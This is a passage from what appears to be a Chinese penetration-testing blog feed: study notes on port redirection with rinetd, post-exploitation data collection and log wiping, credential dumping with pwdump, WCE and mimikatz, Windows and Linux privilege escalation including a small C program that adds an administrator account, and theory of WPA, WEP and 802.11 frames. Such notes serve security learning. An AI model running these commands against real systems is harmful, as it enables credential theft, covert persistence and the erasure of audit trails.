          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nc </tag>
            
            <tag> 端口转发 </tag>
            
            <tag> shell </tag>
            
            <tag> SSH </tag>
            
            <tag> 隧道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量操控技术之重定向</title>
      <link href="/2015/07/01/Traffic_manipulation/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/"/>
      <url>/2015/07/01/Traffic_manipulation/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="流量操控技术"><a href="#流量操控技术" class="headerlink" title="流量操控技术"></a><strong>流量操控技术</strong></h3></blockquote><ul><li>Traffic manipulation technique</li><li>渗透测试中经常遇到访问受限的网络环境</li><li>使用隐蔽的手段逃避安全检查措施和溯源追踪</li><li>证明看似严格的访问控制仍然存在弱点</li><li>在非受信任的网络中实现安全的数据传输</li><li>部分概念的实现过程略有烧脑</li></ul><h4 id="重定向-Redirection"><a href="#重定向-Redirection" class="headerlink" title="重定向 (Redirection)"></a><strong>重定向</strong> (Redirection)</h4><ul><li>IP,Port<h4 id="隧道-Tunnel"><a href="#隧道-Tunnel" class="headerlink" title="隧道 (Tunnel)"></a><strong>隧道</strong> (Tunnel)</h4></li><li>在不受信任的网络环境中实现安全的通信</li><li>通常使用多种加密技术建立通信隧道</li><li>点到点(IP2IP),端到端(Port2Port)隧道</li><li>VPN:pptp,l2tp,IPSec,SSL vpn</li></ul><h4 id="封装-Encapsulation"><a href="#封装-Encapsulation" class="headerlink" title="封装 (Encapsulation)"></a><strong>封装</strong> (Encapsulation)</h4><ul><li>通常结合在隧道中使用,使用一种协议封装一种协议(RPC o http,VoIP)</li><li>使用网关设备实现不同类型网络的互联互通</li></ul><h4 id="Rinetd"><a href="#Rinetd" class="headerlink" title="Rinetd"></a><strong>Rinetd</strong></h4><p>安装: <code>apt-get install rinetd</code><br>配置: <code>/etc/rinetd.conf</code><br>    <code>bindadd</code> <code>bindport</code> <code>connectadd</code> <code>connectport</code><br>运行: <code>rinetd</code></p><h5 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a><strong>应用场景</strong></h5><ul><li>重定向web流量,突破上网限制</li><li>远程桌面重定向</li><li>nc重定向获得shell</li><li>不兼容FTP等二次连接的协议</li></ul><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h4><ul><li>安装monowall防火墙限制只某个端口能连接外网</li><li>一台模拟公司内网win机器,内网通过防火墙允许的端口访问Kali,由Kali重定向到外网</li><li>配置一台防火墙以外的Kali安装Rinetd作流量转发</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nc </tag>
            
            <tag> 隧道 </tag>
            
            <tag> 重定向 </tag>
            
            <tag> Rinetd </tag>
            
            <tag> monowall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>敏感数据收集及隐蔽痕迹</title>
      <link href="/2015/06/11/Exploits/%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86%E5%8F%8A%E9%9A%90%E8%94%BD%E7%97%95%E8%BF%B9/"/>
      <url>/2015/06/11/Exploits/%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86%E5%8F%8A%E9%9A%90%E8%94%BD%E7%97%95%E8%BF%B9/</url>
      
        <content type="html"><![CDATA[<h4 id="get权限后的基本信息收集"><a href="#get权限后的基本信息收集" class="headerlink" title="get权限后的基本信息收集"></a><strong>get权限后的基本信息收集</strong></h4><p><strong>linux</strong></p><pre><code>/etc/resolv.conf    #dns信息/etc/passwd            #用户账号/etc/shadow            #用户密码,只有root权限可读whoami,who --a        #当前登录用户inconfig -a ,iptables -l -n,netstat -rn        #ip配置,防火墙配置,及网关路由查看uname -a ,ps aux    #查看当前系统版本和当前运行进程dpkg -l | head        #查看当前系统安装的软件包</code></pre><p><strong>windows</strong></p><pre><code>ipconfig /all,ipconfig /displaydns,netstat -bnao,netstat --rnet view,net view /domainnet user /domain,net user %username% /domainnet accounts,net sharenet localgroup administrators username /add        #将username加入管理员组net group &quot;Domain Controllers&quot; /domainnet share name$=C:\ /unlimited        #开共享net user username /active:yes /domain    #域环境下启用锁定账号</code></pre><h4 id="WMIC-Windows-Management-Instrumentation-windows管理框架"><a href="#WMIC-Windows-Management-Instrumentation-windows管理框架" class="headerlink" title="WMIC (Windows Management Instrumentation)    #windows管理框架"></a><strong>WMIC</strong> (Windows Management Instrumentation)    #windows管理框架</h4><pre><code>wmic nicconfig get ipaddress,macaddress    #查IPwmic computersystem get username        #获取系统用户    wmic netlogin get name,lastlogonwmic process get caption,executablepath,commandline        #查看进程运行的程序wmic process where name=&quot;calc.exe&quot; call terminate        #终止指定进程wmic os get name,servicepackmajorversion                #查看操作系统版本判断是否打补丁wmic product get name,version                            #查看操作系统安装了哪些程序wmic product where name=&quot;name&quot; call uninstall /nointeractive    #静默卸载指定程序,比如杀软wmic share get /ALL                                        #查看共享wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;    #远程启用远程桌面设置wmic nteventlog get path,filename,writeable                #删除日志</code></pre><h4 id="收集敏感数据"><a href="#收集敏感数据" class="headerlink" title="收集敏感数据"></a><strong>收集敏感数据</strong></h4><ul><li><p>商业信息</p></li><li><p>系统信息</p></li><li><p><em>linux*</em></p><p>   /etc ; /usr/local/etc<br>   /etc/password ; /etc/shadow<br>   .ssh ; .gnupg 公私钥<br>   The e-mail and data files<br>   业务数据库 ； 身份认证服务器数据库<br>   /tmp</p></li></ul><p><strong>windows</strong></p><pre><code>SAM数据库；注册表文件%SYSTEMROOT%\repair\SAM    #SAM修复备份数据%SYSTEMROOT%\System32\config\RegBack\SAM业务数据库；身份人证数据库临时文件目录UserProfile\AppData\Local\Microsoft\Windows\Temporary Intermet Files\</code></pre><h4 id="隐蔽痕迹"><a href="#隐蔽痕迹" class="headerlink" title="隐蔽痕迹"></a><strong>隐蔽痕迹</strong></h4><pre><code>禁止在登录界面显示新建账号REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /v uname /T REG_DWORD /D O #隐藏用户del %WINDIR%\*.log /a/s/q/fHistory -c    #清空命令历史纪录日志    auth.log /secure    btmp /wtmp    lastlog     faillog    last    lastb其它日志和HIDS等lsttr    #查看文件权限属性chattr +i .bash_history    #修改文件权限属性为不可写,且不纪录操作历史</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> wmic </tag>
            
            <tag> 隐蔽痕迹 </tag>
            
            <tag> lsttr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码嗅探</title>
      <link href="/2015/06/07/Exploits/%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/"/>
      <url>/2015/06/07/Exploits/%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h4 id="抓包嗅探工具"><a href="#抓包嗅探工具" class="headerlink" title="抓包嗅探工具"></a>抓包嗅探工具</h4><ul><li><p>Windows</p><ul><li>Wiresharek</li><li>Omnipeek</li><li>commview</li><li>Sniffpass    #只嗅探密码</li></ul></li><li><p>Linux</p><ul><li>Tcpdump</li><li>Wireshark</li><li>Dsniff        #只嗅探密码</li></ul></li></ul><p><strong>键盘纪录</strong></p><ul><li><p>Keylogger</p></li><li><p>木马窃取</p></li><li><p>本地缓存密码</p></li><li><p>浏览器缓存密码</p><ul><li>IE浏览器</li><li>firefox</li></ul></li><li><p>网络密码</p></li><li><p>无线密码</p></li><li><p><code>http://www.nirsoft.net</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dump SAM#从SAM数据库里读取用户名及hash密码</span><br><span class="line">Pwdump.exe&#x2F;?</span><br><span class="line">pwdump.exe localhost#查看本机所有用户及hash密码,然后用ophcrack进行暴力破解</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;fgdump&#x2F;</span><br></pre></td></tr></table></figure></li></ul><p><strong>WCE</strong>(Windows Credential Editor)    #windows身份验证信息编辑器</p><pre><code>/usr/share/windows-resources/wce需要管理员权限wce-universal.exe -l / -lv        #从内存读取已登录的用户名及HASH密码wce-universal.exe -d            #删除LUID对应的密码wce-universal.exe -e / -r        #刷新wce-universal.exe -g            #计算hashwce-universal.exe -w            #读取内存里缓存的明文密码LM/NT hash从内存读取LM/NTLM hashDigest Authentication PackageNTLM Security PackageKerberos Security Package</code></pre><p><strong>防止WCE攻击</strong></p><pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Package    kerberos    msv1_0    schannel    wdigest        #删除注册表键值可防止WCE攻击    tspkg        #删除注册表键值可防止WCE攻击    pku2u</code></pre><p><strong>其它类似wce工具</strong></p><pre><code>pwdump localhostfgdumpmimikatz    #俄罗斯人开发的神器,功能强大    /usr/share/windows-resources/mimikatz    #程序所在kali路径    privilege::debug    #提升权限    sekurlsa::logonPasswords    #查询hash及明文密码    event::drop        #不产生系统安全日志    event::clear    #清除系统安全日志    ::                #查看程序帮助</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抓包嗅探 </tag>
            
            <tag> mimikatz </tag>
            
            <tag> WCE </tag>
            
            <tag> dsniff </tag>
            
            <tag> Keylogger </tag>
            
            <tag> pwdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用漏洞和程序配置不当提权</title>
      <link href="/2015/06/06/Exploits/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/"/>
      <url>/2015/06/06/Exploits/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="利用漏洞提权windows"><a href="#利用漏洞提权windows" class="headerlink" title="利用漏洞提权windows"></a><strong>利用漏洞提权windows</strong></h4></blockquote><p><code>Ms11-080</code>        #此漏洞在中文版的系统中利用是DOS拒绝服务的攻击效果,而非提权</p><pre><code>Kb2592799    https://technet.microsoft.com/library/sevurity/ms11-080searchsploit Ms11-080exploits/windows/local/18176.py    Pyinstaller        #将python脚本编译为EXE需要用到的包    https://pypi.python.org/pypi/PyInstaller/2.1Pywin32            #将python脚本编译为EXE需要用到的扩展    http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/python pyinstaller.py --onefile 18176.py #将18176.py编译为exe可执行程序    MS11-046        #拒绝服务漏洞    DoSMs14-068        #普通用户提权到域服务器管理库    https://github.com/bidord/pykekms14-068.py -u user@lab.com -s userSID -d dc.lab.com拷贝 TGT_user1@lab.com.ccache 到windows系统本地管理员登录    mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit    dsa.msc        #域控制器管理</code></pre><blockquote><h3 id="利用漏洞提权linux"><a href="#利用漏洞提权linux" class="headerlink" title="利用漏洞提权linux"></a><strong>利用漏洞提权linux</strong></h3></blockquote><pre><code>Ubuntu 11.10    http://old-releases.ubuntu.com/releases/11.10gcc    sudo mount /dev/cdrom /media/cdrom    #挂载镜像    sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc    #把镜像加入安装源并安装GCC    gcc 18411.c -o expCVE-2012-0056    /proc/pid/mem    kernels&gt;=2.6.39    http://blog.zx2c4.com/749    scp /usr/share/exploitdb/platforms/linux/local/18411.c cat@192.168.1.118:/home/cat/        将利用脚本拷贝到目标机器</code></pre><blockquote><h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a><strong>利用配置不当提权</strong></h4></blockquote><p>与系统漏洞提权相比,更常用的方法<br>企业环境<br>补丁更新的全部已经安装<br>输入变量过滤之外更值得研发关注的安全隐患<br>以system权限启动<br>NTFS权限允许users修改删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">icacls</span><br><span class="line">icacls c:\windows\*.exe &#x2F;save perm &#x2F;T#快速查找windows系统中所有NTFS权限配置不当的程序</span><br><span class="line">i586-mingw32msvc-gcc -o admin.exe admin.c#快速查找linux系统中所有NTFS权限配置不当的程序</span><br><span class="line">Find</span><br><span class="line">find &#x2F; -perm 777 -exec ls -l &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><strong>admin.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">i=system (<span class="string">"net localgroup administrators a /add"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>应用系统的配置文件<ul><li>应用连接数据库的配置文件</li><li>后台服务运行账号</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gcc </tag>
            
            <tag> mimikatz </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线加密技术WPA安全系统</title>
      <link href="/2015/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/"/>
      <url>/2015/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a><strong>WPA安全系统</strong></h4><p>Wi-Fi Protected Access<br>    802.11i 组为提高无线安全,开发两个新的链路层加密协议<br>        Temporal Key Integrity Protocol(TKIP)<br>            WPA1(较之WEP可动态改变密钥)<br>        Counter Mode with CBC-MAC(CCMP)<br>            WPA2<br>    WPA加密两种安全类型<br>        WPA个人:使用预设共享密钥实现身份验证<br>        WPA企业:使用802.1X和Radius服务器实现AAA(认证协议框架EAP)</p><h4 id="WPA1"><a href="#WPA1" class="headerlink" title="WPA1"></a><strong>WPA1</strong></h4><p>802.11i 第三版草案<br>    与WEP比较<br>        都采用逐包进行密钥加密<br>        128位的key和48位的初向量(IV)<br>        RC4流加密数据<br>        帧计数器避免重放攻击<br>        TKIP使用Michael算法进行完整性校验(MIC)<br>            WEP 使用CRC32进行MIC<br>        兼容早期版本硬件</p><h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a><strong>WPA2</strong></h4><p>依据802.11i 完全重新设计实现<br>        也被称为Robust Security Network(RSN)<br>        CCMP替代TKIP<br>        AES加密算法取代了RC4<br>        不兼容早期版本硬件</p><h4 id="WPA企业连接过程"><a href="#WPA企业连接过程" class="headerlink" title="WPA企业连接过程"></a><strong>WPA企业连接过程</strong></h4><ul><li>协商安全协议</li><li>身份认证</li><li>密钥分发和验证</li><li>数据加密完整性</li></ul><h4 id="WPA-PSK"><a href="#WPA-PSK" class="headerlink" title="WPA-PSK"></a><strong>WPA-PSK</strong></h4><ul><li>协商安全协议</li><li>密钥分发和验证</li><li>数据加密完整性</li></ul><h4 id="协商安全协议"><a href="#协商安全协议" class="headerlink" title="协商安全协议"></a><strong>协商安全协议</strong></h4><p>协商认证方式<br>        PSK / 802.1X<br>    单播和组播/广播流量加密套件<br>        TKIP / CCMP<br>    STA通过probe获取无线网络信息<br>        速率<br>        加密<br>        通道<br>        名称</p><h4 id="身份认证-WPA企业"><a href="#身份认证-WPA企业" class="headerlink" title="身份认证(WPA企业)"></a><strong>身份认证(WPA企业)</strong></h4><p>身份认证基于Extensible Authentication Protocol(EAP)实现<br>        EAP-TLS,需要客户端和服务器证书<br>        EAP-TTLS<br>        PEAP混合身份验证,只需要服务器证书<br>    客户端选择身份认证方式<br>    AP发送身份验证信息给Radius Server,<br>    Radius Server返回”Radius Accept”报时认证成功<br>        其中包含Master Key(MK)<br>    AP通过EAP消息通知STA认证成功</p><h4 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a><strong>密钥交换</strong></h4><p>无线网络设计用于一组无线设备通信<br>        关联到同一AP的设备共享无线信道<br>        单播,广播,组播<br>            安全特性要求不同<br>            单播通信需要单独密钥加密通信双方流量<br>            pairwise key:对偶临时密钥(PIK)<br>            组播通信需要信任域内所有成员共享的同一密钥<br>            group key:组临时密钥(GTK)</p><p><strong>PMK</strong><br>安全上下文的顶级密钥<br>        MK进行TLS-PRF加密得出PMK<br>    基于服务密钥<br>        由上层身份验证方法服务器生成<br>        从服务器通过 radius传给AP<br>        从AP通过EAP消息传给所有STA<br>    基于PSK共享密钥<br>        Essid+PSK+迭代次数4096—-Hash计算生成<br>        STA和AP分别计算得出PMK,并不在网络中传递交换<br>    256位即32字节</p><h4 id="PTK的生成过程"><a href="#PTK的生成过程" class="headerlink" title="PTK的生成过程"></a><strong>PTK的生成过程</strong></h4><ul><li>HMAC-SHA1散列算法</li><li>PRF-X散列算法</li></ul><h5 id="四步握手过程生成PTK"><a href="#四步握手过程生成PTK" class="headerlink" title="四步握手过程生成PTK"></a><strong>四步握手过程生成PTK</strong></h5><ul><li>AP发送Anonce给STA</li><li>STA生成Snonce计算出PTK</li><li>Snonce加PTK的MIC发给AP</li><li>AP拿到Snonce计算出PTK</li><li>AP计算MIC与接收的MIC比对</li><li>MIC一致说明确定STA知道PMK<br>  AP发GTK给STA<br>  STA回复ACK并使用密钥加密</li></ul><p>数据加密和完整性<br>    三种算法<br>        Temporal Key Integrity Protocol(TKIP)4<br>        Counter Mode with CBC-MAC(CCMP)5<br>        Wireless Robust Authenticated Protocol(WRAP)6</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WPA </tag>
            
            <tag> 无线加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEP加密及RC4算法</title>
      <link href="/2015/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/"/>
      <url>/2015/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a><strong>加密</strong></h4><p>无线安全根源<br>    802.11基于无线电波发射信息<br>    嗅探侦听是主要问题<br>    加密机制是必须手段<br>Wired Equivalent Privacy(WEP)<br>    802.11标准的一部分<br>    发布后不久被发现存在安全漏洞<br>Wi-Fi Protected Access(WPA)取代WEP<br>    WPA2(802.11i 标准)</p></blockquote><h4 id="OPEN无加密网络"><a href="#OPEN无加密网络" class="headerlink" title="OPEN无加密网络"></a><strong>OPEN无加密网络</strong></h4><p>无任何加密机制<br>    所有数据都可以被嗅探<br>    STA和AP只协商拼配参数即可连入网络        </p><h4 id="WEP加密"><a href="#WEP加密" class="headerlink" title="WEP加密"></a><strong>WEP加密</strong></h4><p>使用Rivest Cipher 4(RC4)算法加密流量内容,实现机密性<br>    CRC32算法检查数据完整性<br>    标准采用使用24位initialization vector(IV)<br>    受美国加密技术出口限制法律的要求<br>        高于64bit key禁止出口<br>        所以除24bit IV之外真实的key只有40bit的版本被允许出口<br>        出口限制法律撤销后实现了128bit key的WEP版本(使用相同的24bit IV)</p><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a><strong>RC4算法</strong></h4><p>RSA实验室研发的对称加密流算法<br>        实现简单<br>        速度快<br>    加密:对明文流和密钥流进行XOR计算(XOR:二进制异或运算)<br>    解密:对密文流和密钥流进行XOR计算<br>    RC4算法key由两个过程生成<br>        合并IV和PSK,利用Key Scheduling Algorithm(KSA)算法生成起始状态表<br>        Pseudo-Random Generation Algorithm(PRGA)算法生成最终密钥流<br>RC4算法加密流程<br>RC4算法解密流程</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线加密 </tag>
            
            <tag> RC4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线通信技术Radiotap Head原理</title>
      <link href="/2015/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/"/>
      <url>/2015/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="Radiotap-Head"><a href="#Radiotap-Head" class="headerlink" title="Radiotap Head"></a><strong>Radiotap Head</strong></h4><p>802.11侦发射和接收的事实标准,802.11依赖Radiotap完成通信过程<br>Linux系统在驱动和API中内建支持Radiotap<br>802.11帧发射之前,网卡驱动在802.11头前面添加Radiotap头,反之当网卡接收到无线帧时,驱动通知MAC层,此帧头包含Radiotap头<br>Radiotap为802.11帧传递额外信息,厂家可自定义,因此头长度不固定<br>不破坏原始头结构,增加传递的信息</p><h4 id="分为Header和data"><a href="#分为Header和data" class="headerlink" title="分为Header和data"></a><strong>分为Header和data</strong></h4><p>Version(8bit)<br>    值始终为0<br>Pad(8bit)<br>    未使用,只作为字段强制对其占位；<br>Length(16bit)<br>    整个radiotap头长度(可变),作用是确定802.11头的开始位置<br>Present(32bit)<br>    Data段的掩码<br>    Ext(1,0)<br>    MAC不能理解的头部直接忽略</p><h4 id="802-11头部信息"><a href="#802-11头部信息" class="headerlink" title="802.11头部信息"></a><strong>802.11头部信息</strong></h4><p>DU(Data Unit)即数据单元,信息传输的最小数据集合<br>    传递过程逐层封装(Encapsulation)<br>    SDU(Service Data Unit) /PDU(Protocol Data Unit)<br>    MSDU–&gt;MIC–&gt;分帧–&gt;添加IV–&gt;加密–&gt;添加MAC头部–&gt;MPDU<br>    MPDU/PSDU+物理头=PPDU–&gt;RF发射</p><h4 id="802-11-MAC头结构"><a href="#802-11-MAC头结构" class="headerlink" title="802.11 MAC头结构"></a><strong>802.11 MAC头结构</strong></h4><p>Frame Control<br>    Protocol Version(2bit)    :802.11协议版本,始终为0,1,2,3<br>    Type(2bit)    :规定帧的具体用途(3种帧类型)<br>        控制帧(1)<br>        数据帧(2)<br>        管理帧(0)<br>    SubType(4bit)<br>        每个类型对应多个子类型,协议规定不同类型/子类型的帧完成不同功能的操作<br>    To DS/From (1/1bit)<br>        标识帧的传输方向,传向DS或者来自DS；这两个字段的值决定着MAC头中4个Adddress字段的不同定义.<br>    0x00:出现在IBSS环境中(可能是Management帧或者是Control帧类型)；或者是STSL(Stantion to Station Link)中两个STA间通信,这种情况下通信不通过AP；<br>    0x01:表示Data帧从AP向STA传递;<br>    0x02:表示Data帧从Sta向AP传递;<br>    0x03:表示两个AP间通信,这是典型的WDS(Wireless Distribution System)环境下AP间的通信,或者表示Mesh环境下MP间的通信；只有此时才会使用到Address4字段；    </p><p>More frag(1bit):表示是否还有后续帧<br>        值为1时表示有后续分段,可能是Data或Management帧类型.只有单播接收地址的帧会被分段；<br>    Retry(1bit):重传<br>        值为1表示重传帧,可能是Data或Management帧类型,接收端进程使用此值防止帧重复；<br>    Power Mgmt(1bit):活动模式(0)/省电模式(1)<br>        STA处于省电模式时,向关联的AP发送该值为1的帧(AP从不使用此字段),省电模式下STA不接收数据,发送给它的Data帧由AP暂时缓存；<br>    More Data(1bit)<br>        当AP缓存了至少一个MSDU时,会向省电模式的STA发送该值为1的帧,表示有数据要传输给STA,接收到此帧的STA唤醒自己并向AP发送PS-Poll帧,<br>        取回由AP为其缓存的数据.也被用于AP有更多的广播/多播帧需要发送的情况；<br>    Protected Frame(1bit)<br>        可能是Data或Management帧类型,表示MSDU是否被加密；也被用于表示PSK身份验证Frame#3帧;数据载荷为空时,该字段值为0；<br>    Order(1bit)<br>        在非QoS帧的情况下,值为1表示数据必须按严格顺序处理,通常为0；</p><h4 id="Duration-ID-16bit"><a href="#Duration-ID-16bit" class="headerlink" title="Duration/ID(16bit)"></a><strong>Duration/ID(16bit)</strong></h4><p>所有Control帧都使用该字段,其作用随Type/SubType变化有所不同；<br>    帧类型为PS Poll(type:1,subtype:10)时,表示STA关联的AIP(association identity);<br>    其他情况下该字段作为一种载波侦听机制,表示接收下一帧之前需要保持的时间间隔,用于NAV(Network Allocation Vector)计算,单位是微秒；</p><h4 id="MAC-Layer-Address"><a href="#MAC-Layer-Address" class="headerlink" title="MAC Layer Address"></a><strong>MAC Layer Address</strong></h4><p>前面已经提到了4种,这里补充最后一种:Basic service set ID(BSSID); 它是BSS的2层唯一标识,Infrastructure模式中BSSID就是AP的MAC地址,当AP支持多BSS时,随机生成每个BSSID；</p><h4 id="Sequence-Control-16bit"><a href="#Sequence-Control-16bit" class="headerlink" title="Sequence Control(16bit)"></a><strong>Sequence Control(16bit)</strong></h4><p>这个字段包含两个子字段:Sequence Number和Fragment Number;<br>    Sequence Number是每个帧的编号,数值范围是0–4095,以1为步长递增.当帧被分段时,同一帧中不同分段的Sequence Number相同；<br>    Fragment Number是被分段的帧用于标识分段位置顺序的编号,数值范围是0–15,以1为步长递增；</p><h4 id="DATA部分"><a href="#DATA部分" class="headerlink" title="DATA部分"></a><strong>DATA部分</strong></h4><p>Frame Body(变长)<br>    数据字段,未加密的最大MSDU长度为2304字节(其中包含最大256字节的上层头信息,和可被传递的数据2048字节).<br>    不同的加密方法会增加一定的内容长度；<br>    WEP:8 bytes–&gt;2312bytes<br>    TKIP(WPA1):20bytes–&gt;2324bytes<br>    CCMP(WPA2):16bytes–&gt;2320bytes<br>    注:Control类型的帧没有Frame Body内容.</p><h4 id="FCS-32bit"><a href="#FCS-32bit" class="headerlink" title="FCS(32bit)"></a><strong>FCS(32bit)</strong></h4><p>发送端对全部MAC包头和Frame Body内容进行CRC计算,计算结果即为FCS(Frame Check Sequence)值,接收端进行同样的计算,结果一致时,<br>    则接收端向发送端返回ACK,否则丢弃帧(只对单播帧有效,FCS错误的广播/多播帧可能被接收)<br>    注:wireshark抓包时已经删除了FCS值</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 802.11 </tag>
            
            <tag> 无线数据帧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux无线协议栈及配置命令</title>
      <link href="/2015/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/"/>
      <url>/2015/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/</url>
      
